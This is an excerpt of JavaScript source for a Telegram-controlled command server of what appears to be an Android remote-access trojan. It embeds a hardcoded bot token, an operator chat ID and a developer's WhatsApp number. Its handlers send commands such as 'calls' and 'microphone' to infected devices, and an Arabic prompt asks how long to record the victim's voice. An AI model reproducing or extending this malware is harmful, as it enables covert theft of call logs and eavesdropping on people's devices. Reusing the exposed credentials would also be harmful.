...
const token = '8271435438:AAFZ57pfXtDcwa3xm77ZkN_RJAU3-QUIUew'
const id = '7604667042'
...
appBot.on('message', (message) => {
    ...
    if(chatId == id){
        ...
        if(message.text == '💬 واتساب المطور'){
            appBot.sendMessage(id, 'https://wa.me/967776080513')
        }

        if(message.text == '📺 قناة اليوتيوب'){
            appBot.sendMessage(id, 'https://youtube.com/@user-afe?si=_A-z5jZhPHM44d43')
        }

        if(message.text == '📢 قناة التليجرام'){
            appBot.sendMessage(id, 'https://t.me/muh_739')
        }
...
appBot.on("callback_query", (callbackQuery) => {
    ...
    // جميع الأوامر الأخرى بنفس النمط
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
    ...
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل المدة الذي تريد تسجيل صوت الضحية\n\n' +
